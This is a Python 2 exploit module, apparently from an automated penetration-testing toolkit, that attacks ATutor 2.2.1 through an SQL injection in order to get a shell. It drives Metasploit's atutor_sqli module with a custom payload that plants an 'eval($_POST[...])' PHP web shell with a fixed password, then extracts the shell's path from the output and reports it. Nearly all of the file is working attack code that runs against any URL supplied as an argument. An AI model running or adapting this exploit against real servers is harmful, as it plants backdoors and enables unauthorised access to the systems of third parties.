#coding: utf-8
import urlparse
import os, re
import sys
import datetime
import urllib
import base64
from exp_template import Exploit, Level, session, get_random_password
import re, random
from commonlib.process import proc

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit
exp打击无法实现
modify by swm 20180817

"""


class atutor_v2_2_1_get_shell(Exploit):
    def meta_info(self):
        return {
            'name': 'atutor_v2_2_1_get_shell',
            'author': 't',
            'date': '2018-04-24',
            'attack_type': 'GetShell',
            'app_type': 'CMS', 
            'app_name': 'atutor',
            'min_version': '',
            'max_version': '',
            'version_list': '2.11.2',
            'description': '教学内容管理系统ATutor 2.2.1注入漏洞导致的GetShell。',
            'reference':'',
            'cve':'',
        }

    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        self.url = self.url.strip('/')
        target_uri = '/'.join(self.url.split('/')[3:]) or '/'
        print target_uri
        is_ssl = "true" if 'https' in self.url else 'false'
        password = 'cesna'
        words = "eval($_POST[%s])" % password

        url_parser = urlparse.urlparse(self.url)
        if ':' in url_parser.netloc:
            host, port = url_parser.netloc.split(':')
            host_port_setting = 'set rhost %s;' % host
            host_port_setting += 'set rport %s;' % port
        else:
            host_port_setting = 'set rhost %s;' % url_parser.netloc
        cmd = '''msfconsole -qx '
        use multi/http/atutor_sqli;
        set payload generic/custom;
        %s
        set targeturi "%s";
        set ssl "%s";
        set payloadstr %s;
        run;exit -y;'
        ''' % (host_port_setting, target_uri, is_ssl, words)
        print cmd.replace('\n', '')
        p = proc(cmd.replace('\n', ''))
        p.run()
        p.wait()
        x = p.getoutput()
        for line in x:
            print line
        print x
        retrieve_file = re.findall("'/var/(.+).php'", str(x))
        print retrieve_file
        shell_path = '%s/%s.php' % (self.url, retrieve_file[0])
        print shell_path, password
        self.shell_info(shell_path, password, 'php')


if __name__ == "__main__":
    # url = 'http://192.168.40.26:82/ATutor/login.php'
    # a = atutor_v2_2_1_get_shell(url)
    # a.exploit()
    if len(sys.argv) == 2:
        a = atutor_v2_2_1_get_shell(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__

        

